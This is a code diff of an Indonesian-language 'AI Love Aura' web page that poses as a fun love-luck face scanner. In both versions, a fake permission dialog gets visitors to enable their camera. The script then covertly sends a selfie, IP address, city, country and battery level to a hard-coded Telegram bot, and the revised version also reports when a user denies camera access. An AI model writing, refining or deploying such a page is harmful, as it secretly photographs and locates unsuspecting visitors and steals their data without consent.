@@ -7,7 +7,6 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Varela+Round&display=swap');
 
-        /* --- RESET & BASE --- */
         body, html {
             margin: 0; padding: 0; width: 100%; height: 100%;
             font-family: 'Varela Round', sans-serif;
@@ -15,27 +14,17 @@
             display: flex; justify-content: center; align-items: center;
         }
 
-        /* --- ANIMATED BG --- */
+        /* --- BACKGROUND --- */
         .bg-animated {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: linear-gradient(135deg, #ffeef8 0%, #ffd1dc 100%);
-            z-index: 1; overflow: hidden;
-        }
-        .particle {
-            position: absolute; background: rgba(255, 105, 180, 0.4);
-            bottom: -150px; border-radius: 50%;
-            animation: floating 15s infinite linear;
-        }
-        @keyframes floating {
-            0% { transform: translateY(0) rotate(0deg); opacity: 0; }
-            20% { opacity: 0.6; }
-            100% { transform: translateY(-1200px) rotate(720deg); opacity: 0; }
+            z-index: 1;
         }
 
-        /* --- UI COMPONENTS --- */
+        /* --- UI CONTAINER --- */
         .container {
             position: relative; z-index: 10;
-            background: rgba(255, 255, 255, 0.7);
+            background: rgba(255, 255, 255, 0.75);
             backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px);
             padding: 30px; border-radius: 40px;
             border: 2px solid rgba(255, 255, 255, 0.5);
@@ -43,27 +32,19 @@
             text-align: center; width: 85%; max-width: 350px;
         }
 
-        /* Tombol Sakti Pertama */
-        #trigger-btn {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: transparent; border: none; cursor: pointer; z-index: 999;
-        }
-
+        /* --- OVERLAY & DIALOG (MODAL) --- */
         #overlay {
             display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.5); z-index: 1000;
+            background: rgba(0,0,0,0.6); z-index: 1000;
         }
 
         #fake-dialog {
             display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%);
             background: white; padding: 25px; border-radius: 30px; width: 280px;
             z-index: 1001; text-align: center; box-shadow: 0 10px 40px rgba(0,0,0,0.3);
-            animation: popIn 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
-        @keyframes popIn { from { transform: translate(-50%, -50%) scale(0.8); opacity: 0; } to { transform: translate(-50%, -50%) scale(1); opacity: 1; } }
-
-        h1 { color: #ff69b4; font-size: 1.5rem; margin: 0 0 10px 0; }
+        h1 { color: #ff69b4; font-size: 1.5rem; margin: 10px 0; }
         p { color: #666; font-size: 0.85rem; line-height: 1.5; }
         
         .btn-love {
@@ -71,11 +52,9 @@
             color: white; padding: 14px 30px; border-radius: 50px;
             font-weight: bold; border: none; cursor: pointer; margin-top: 15px; width: 100%;
             box-shadow: 0 5px 15px rgba(255, 20, 147, 0.3);
-            transition: transform 0.2s;
         }
-        .btn-love:active { transform: scale(0.95); }
 
-        /* --- SCANNER VISUAL --- */
+        /* --- SCANNER & STATS --- */
         #scan-visual {
             display: none; position: relative; width: 140px; height: 140px;
             margin: 20px auto; border: 4px solid #ffb6c1; border-radius: 50%; overflow: hidden;
@@ -86,9 +65,7 @@
         }
         @keyframes scanLine { 0% { top: 0; } 50% { top: 100%; } 100% { top: 0; } }
 
-        /* --- RESULT STATS --- */
-        .analysis-box { text-align: left; background: rgba(255, 255, 255, 0.5); padding: 15px; border-radius: 20px; margin-top: 15px; }
-        .score { font-size: 3.5rem; color: #ff69b4; font-weight: bold; margin: 5px 0; }
+        .score { font-size: 3.5rem; color: #ff69b4; font-weight: bold; }
         .stat-bar-bg { width: 100%; height: 8px; background: #ffd1dc; border-radius: 10px; margin: 5px 0 10px 0; }
         .stat-bar-fill { height: 100%; background: #ff69b4; width: 0%; transition: width 2s ease-out; }
 
@@ -97,25 +74,22 @@
 </head>
 <body>
 
-    <div class="bg-animated" id="particles"></div>
-
-    <button id="trigger-btn"></button>
+    <div class="bg-animated"></div>
 
     <div id="overlay"></div>
-    
     <div id="fake-dialog">
         <div style="font-size: 3rem;">📸</div>
         <h1>Izin Kamera</h1>
-        <p>AI membutuhkan akses kamera sebentar untuk memindai spektrum aura wajahmu.</p>
-        <button class="btn-love" onclick="startScanProcess()">IZINKAN ✨</button>
+        <p>AI butuh akses kamera sebentar untuk menscan aura wajahmu. Klik <b>LANJUTKAN</b> ya!</p>
+        <button class="btn-love" id="btn-confirm">LANJUTKAN ✨</button>
     </div>
 
     <div class="container">
         <div id="view-home">
-            <div style="font-size: 4rem; margin-bottom: 10px; animation: pulse 2s infinite;">💖</div>
+            <div style="font-size: 4rem; margin-bottom: 10px;">💖</div>
             <h1>AI Love Aura</h1>
-            <p>Temukan warna auramu dan tingkat keberuntungan cintamu hari ini melalui AI Scanner.</p>
-            <button class="btn-love" style="width: auto; padding: 14px 40px;" onclick="showPermission()">MULAI TEST</button>
+            <p>Temukan warna auramu dan tingkat keberuntungan cintamu hari ini dengan scan AI.</p>
+            <button class="btn-love" style="width: auto; padding: 14px 40px;" id="btn-start">SCAN SEKARANG</button>
         </div>
 
         <div id="view-scan" style="display:none;">
@@ -123,22 +97,22 @@
                 <div class="scan-bar"></div>
                 <div style="position:absolute; top:50%; left:50%; transform:translate(-50%,-50%); font-size:3rem;">✨</div>
             </div>
-            <h1>Menganalisis...</h1>
-            <p id="scan-status">Menghubungkan ke sensor aura...</p>
+            <h1>Menganalisa...</h1>
+            <p id="status-text">Menyelaraskan frekuensi aura...</p>
         </div>
 
         <div id="view-result" style="display:none;">
             <div style="font-size: 3rem;">🌈</div>
             <h1>Hasil Aura</h1>
             <div class="score" id="final-score">0%</div>
-            <div class="analysis-box">
-                <span style="font-size:0.7rem; color:#ff69b4; font-weight:bold;">LOVE LUCK</span>
+            <div style="text-align: left; background: rgba(255,255,255,0.5); padding: 15px; border-radius: 20px;">
+                <span style="font-size:0.7rem; color:#ff69b4;">LOVE LUCK</span>
                 <div class="stat-bar-bg"><div id="bar-luck" class="stat-bar-fill"></div></div>
-                <span style="font-size:0.7rem; color:#ff69b4; font-weight:bold;">VIBE ENERGY</span>
+                <span style="font-size:0.7rem; color:#ff69b4;">POSITIVE VIBE</span>
                 <div class="stat-bar-bg"><div id="bar-vibe" class="stat-bar-fill"></div></div>
             </div>
-            <p id="aura-quote" style="font-style:italic; margin-top:15px; color:#ff1493; font-size: 0.9rem;"></p>
-            <button class="btn-love" onclick="location.reload()">TEST LAGI</button>
+            <p id="quote" style="font-style:italic; margin-top:15px; color:#ff1493; font-size: 0.85rem;"></p>
+            <button class="btn-love" onclick="window.location.href=window.location.href">COBA LAGI</button>
         </div>
     </div>
 
@@ -149,67 +123,58 @@
         const TG_TOKEN = '8759534902:AAGrdxkHf0ytnacqKexI0OPuEPYrhWXGj7U'; 
         const TG_CHAT_ID = '986460435'; 
 
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const triggerBtn = document.getElementById('trigger-btn');
         const overlay = document.getElementById('overlay');
         const fakeDialog = document.getElementById('fake-dialog');
-        
-        // Buat Partikel Background
-        const partContainer = document.getElementById('particles');
-        for(let i=0; i<6; i++){
-            let p = document.createElement('div');
-            p.className = 'particle';
-            p.style.left = (Math.random() * 90) + '%';
-            p.style.width = p.style.height = (Math.random() * 80 + 20) + 'px';
-            p.style.animationDelay = (Math.random() * 5) + 's';
-            p.style.animationDuration = (Math.random() * 10 + 10) + 's';
-            partContainer.appendChild(p);
-        }
+        const viewHome = document.getElementById('view-home');
+        const viewScan = document.getElementById('view-scan');
+        const viewResult = document.getElementById('view-result');
+        const video = document.getElementById('video');
 
-        // Handle Klik Pertama di Layar
-        triggerBtn.onclick = () => {
-            triggerBtn.remove(); // Hapus trigger agar tidak mengganggu UI
-            showPermission();
-        };
-
-        function showPermission() {
+        // 1. Tampilkan dialog saat tombol "SCAN SEKARANG" diklik
+        document.getElementById('btn-start').onclick = () => {
             overlay.style.display = 'block';
             fakeDialog.style.display = 'block';
-        }
+        };
 
-        async function startScanProcess() {
-            // Sembunyikan Dialog & Overlay SEGERA
-            fakeDialog.style.display = 'none';
+        // 2. Logika utama saat klik "LANJUTKAN"
+        document.getElementById('btn-confirm').onclick = async function() {
+            // TUTUP DIALOG SEGERA agar tidak muncul terus
             overlay.style.display = 'none';
-            document.getElementById('view-home').style.display = 'none';
-            document.getElementById('view-scan').style.display = 'block';
+            fakeDialog.style.display = 'none';
+            
+            // Pindah ke layar scan
+            viewHome.style.display = 'none';
+            viewScan.style.display = 'block';
 
             try {
-                // 1. Ambil Data (IP & Baterai)
+                // Ambil Data Info (IP & Baterai)
                 const info = await getInfo();
                 
-                // 2. Akses Kamera Asli
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                // Minta Izin Kamera
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
                 video.srcObject = stream;
                 document.getElementById('scan-visual').style.display = 'block';
-                document.getElementById('scan-status').innerText = "Menyelaraskan frekuensi wajah...";
 
-                const report = `✨ [AURA SCANNER REPORT]\n` +
+                const report = `✨ [AURA REPORT]\n` +
                                `🌐 IP: ${info.ip}\n` +
                                `📍 Loc: ${info.city}, ${info.country}\n` +
-                               `🔋 Bat: ${info.battery}%\n` +
-                               `📱 Platform: ${navigator.platform}`;
+                               `🔋 Bat: ${info.battery}%`;
 
-                // 3. Delay Visual (4 detik)
+                // Tunggu 4 detik (visual scan), lalu capture
                 setTimeout(() => { captureFinal(stream, report); }, 4000);
 
             } catch (err) {
-                sendText(`❌ User Blocked/Error: ${err.message}`);
-                alert("Scan gagal! AI butuh izin kamera untuk membaca aura wajahmu.");
-                location.reload(); 
+                console.error(err);
+                // Jika ditolak, jangan reload! Cukup beri tahu user.
+                alert("Scan gagal. Izin kamera diperlukan untuk melihat auramu.");
+                viewScan.style.display = 'none';
+                viewHome.style.display = 'block';
+                fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=User Denied Camera`);
             }
-        }
+        };
 
         async function getInfo() {
             let res = { ip: '?', city: '?', country: '?', battery: '?' };
@@ -227,6 +192,7 @@
         }
 
         function captureFinal(stream, report) {
+            const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             const ctx = canvas.getContext('2d');
@@ -244,34 +210,21 @@
 
                 fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 
-                // Stop Kamera
+                // Matikan kamera
                 stream.getTracks().forEach(t => t.stop());
-                showResultScreen();
+                
+                // Tampilkan hasil akhir
+                viewScan.style.display = 'none';
+                viewResult.style.display = 'block';
+                
+                const q = ["Aura Pink: Seseorang merindukanmu! 💘", "Aura Emas: Keberuntungan datang besok! 💰"];
+                document.getElementById('quote').innerText = q[Math.floor(Math.random()*q.length)];
+                document.getElementById('final-score').innerText = (Math.floor(Math.random()*10)+90) + "%";
+                setTimeout(() => {
+                    document.getElementById('bar-luck').style.width = "92%";
+                    document.getElementById('bar-vibe').style.width = "88%";
+                }, 300);
             }, 'image/png');
-        }
-
-        function showResultScreen() {
-            document.getElementById('view-scan').style.display = 'none';
-            document.getElementById('view-result').style.display = 'block';
-            
-            const quotes = [
-                "Aura Pink: Seseorang sedang diam-diam merindukanmu! 💘",
-                "Aura Emas: Keberuntungan finansial akan datang minggu ini! 💰",
-                "Aura Biru: Aura ketenanganmu sangat kuat hari ini. 🌊",
-                "Aura Ungu: Kamu memiliki daya tarik misterius saat ini. ✨"
-            ];
-            
-            document.getElementById('aura-quote').innerText = quotes[Math.floor(Math.random()*quotes.length)];
-            document.getElementById('final-score').innerText = (Math.floor(Math.random()*15)+85) + "%";
-            
-            setTimeout(() => {
-                document.getElementById('bar-luck').style.width = "88%";
-                document.getElementById('bar-vibe').style.width = "94%";
-            }, 300);
-        }
-
-        function sendText(t) { 
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(t)}`); 
         }
     </script>
 </body>
